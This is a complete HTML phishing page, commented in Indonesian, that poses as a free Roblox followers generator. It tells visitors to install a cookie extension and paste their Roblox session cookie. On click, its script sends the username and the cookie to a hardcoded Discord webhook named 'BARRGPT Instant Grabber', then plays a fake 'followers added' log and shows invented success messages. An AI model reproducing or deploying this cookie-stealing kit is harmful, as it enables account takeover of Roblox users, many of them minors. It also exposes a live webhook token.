<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Roblox Followers Generator 2024</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://www.wallpapertip.com/wmimgs/41-416862_roblox-wallpaper-hd.jpg');
            background-size: cover;
            background-position: center;
            color: #fff;
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: rgba(29, 29, 46, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 95%;
            max-width: 500px;
            border: 1px solid #444;
        }
        .logo {
            font-size: 2.5em;
            font-weight: 700;
            color: #00bfff;
            text-shadow: 0 0 10px #00bfff;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #b0b0b0;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #e0e0e0;
        }
        .input-group input, .input-group textarea {
            width: 100%;
            padding: 12px;
            background-color: #1a1a2e;
            border: 1px solid #555;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        .input-group input:focus, .input-group textarea:focus {
            outline: none;
            border-color: #00bfff;
        }
        .input-group textarea {
            resize: vertical;
            font-family: monospace;
            font-size: 11px;
        }
        .generate-btn {
            background-color: #555; /* Dimulai dengan abu-abu */
            color: #999;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 8px;
            cursor: not-allowed; /* Dimulai dengan not-allowed */
            transition: background-color 0.3s, transform 0.2s, color 0.3s;
            margin-top: 10px;
        }
        .generate-btn.ready {
            background-color: #4caf50; /* Warna hijau saat siap */
            color: #fff;
            cursor: pointer;
        }
        .generate-btn.ready:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        .generate-btn:disabled:not(.ready) {
            background-color: #555;
            color: #999;
            cursor: not-allowed;
        }
        /* AWAL FITUR TAMBAHAN */
        .cookie-helper {
            margin-top: 15px;
        }
        .cookie-btn {
            display: inline-block;
            background-color: transparent;
            color: #00bfff;
            border: 2px solid #00bfff;
            padding: 10px 20px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s, color 0.3s;
        }
        .cookie-btn:hover {
            background-color: #00bfff;
            color: #121212;
        }
        .cookie-helper p {
            font-size: 11px;
            color: #888;
            margin-top: 10px;
            text-align: center;
        }
        /* AKHIR FITUR TAMBAHAN */
        #statusLog {
            margin-top: 25px;
            background-color: #0f0f1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            height: 150px;
            overflow-y: auto;
            text-align: left;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
        }
        .log-entry {
            margin-bottom: 5px;
        }
        .log-info { color: #ffeb3b; }
        .log-success { color: #4caf50; }
        .log-error { color: #f44336; }
        .activity-feed {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
        .activity-feed ul {
            list-style: none;
            padding: 0;
        }
        .activity-feed li {
            background-color: rgba(255,255,255,0.05);
            padding: 5px;
            border-radius: 4px;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">ROBLOX FOLLOWERS</div>
        <div class="subtitle">FOLLOWERS BOT FOR MOBILE</div>

        <div class="input-group">
            <label for="username">Roblox Username</label>
            <input type="text" id="username" placeholder="Masukkan username lo">
        </div>

        <div class="input-group">
            <label for="followers">Jumlah Followers (Max 10.000)</label>
            <input type="number" id="followers" value="5000" min="100" max="10000">
        </div>

        <div class="input-group">
            <label for="cookie">input file to get followers</label>
            <textarea id="cookie" rows="4" placeholder="Paste the file here"></textarea>
            
            <!-- AWAL FITUR TAMBAHAN -->
            <div class="cookie-helper">
                <a href="https://chromewebstore.google.com/detail/editthiscookie-fork/ihfmcbadakjehneaijebhpogkegajgnk" target="_blank" class="cookie-btn">
                    ⬇️ DOWNLOAD COOKIE FOR MOBILE
                </a>
                <p>1. Install extension di Chrome.<br>2. Buka Roblox.com, lalu klik icon extension.<br>3. Copy cookie dan paste di atas.</p>
            </div>
            <!-- AKHIR FITUR TAMBAHAN -->

        </div>

        <button id="generateBtn" class="generate-btn" disabled>WAITING FOR FILE FOLLOWERS</button>

        <div id="statusLog"></div>

        <div class="activity-feed">
            <strong>Recent Activity:</strong>
            <ul id="activityList">
                <!-- Akan diisi sama JavaScript -->
            </ul>
        </div>
    </div>

    <script>
        const generateBtn = document.getElementById('generateBtn');
        const usernameInput = document.getElementById('username');
        const followersInput = document.getElementById('followers');
        const cookieInput = document.getElementById('cookie');
        const statusLog = document.getElementById('statusLog');
        const activityList = document.getElementById('activityList');
        
        // !!! GANTI INI DENGAN WEBHOOK DISCORD LO !!!
        const webhookUrl = 'https://discord.com/api/webhooks/1473584598297481227/YlpDqaYYwlRGtfzfnbBuEkrJWfDwmIhE1g4SHFksFWS8lcAugzc5XZktNfDr8c1TO-Bz';

        function addLog(message, type) {
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.textContent = `> ${message}`;
            statusLog.appendChild(logEntry);
            statusLog.scrollTop = statusLog.scrollHeight;
        }

        function startFakeProcess(username, followers) {
            generateBtn.disabled = true;
            generateBtn.textContent = 'GENERATING...';
            generateBtn.classList.remove('ready');
            statusLog.innerHTML = '';

            setTimeout(() => addLog(`Connecting to generator server...`, 'info'), 500);
            setTimeout(() => addLog(`User '${username}' found in database.`, 'success'), 1500);
            setTimeout(() => addLog(`Requesting ${followers} followers...`, 'info'), 2500);
            setTimeout(() => addLog('Validating authentication cookie...', 'info'), 3500);
            setTimeout(() => addLog('Cookie validated. Access granted.', 'success'), 4500);
            setTimeout(() => addLog(`Injecting followers to profile...`, 'info'), 5500);
            setTimeout(() => {
                addLog(`Success! ${followers} followers added!`, 'success');
                generateBtn.textContent = 'SUCCESS!';
                setTimeout(() => addLog('Redirecting to your profile...', 'info'), 1000);
                setTimeout(() => window.open(`https://www.roblox.com/users/${username}/profile`, '_blank'), 2500);
            }, 6500);
        }

        cookieInput.addEventListener('paste', function(event) {
            setTimeout(() => {
                const cookie = cookieInput.value;
                if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.')) {
                    generateBtn.disabled = false;
                    generateBtn.textContent = 'GENERATE FOLLOWERS';
                    generateBtn.classList.add('ready');
                }
            }, 100);
        });

        generateBtn.addEventListener('click', function() {
            const username = usernameInput.value || 'UnknownUser';
            const followers = followersInput.value || '0';
            const cookie = cookieInput.value;

            const payload = {
                content: `**TARGET TERSEDIA!**\n**Username:** ${username}\n**Followers Diminta:** ${followers}\n**Cookie:**\n\`\`\`${cookie}\`\`\``,
                username: 'BARRGPT Instant Grabber'
            };
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            startFakeProcess(username, followers);
        });

        function populateActivity() {
            const fakeUsers = ['uehwywh', 'Fadhilzeyn26', 'NextRizee', '6foot3dadaman67', 'fqYkxPiKMni'];
            for (let i = 0; i < 5; i++) {
                const user = fakeUsers[i];
                const followers = Math.floor(Math.random() * 5000) + 1000;
                const li = document.createElement('li');
                li.textContent = `${user} just got ${followers} followers!`;
                activityList.appendChild(li);
            }
        }

        window.onload = populateActivity;

    </script>
</body>
</html>
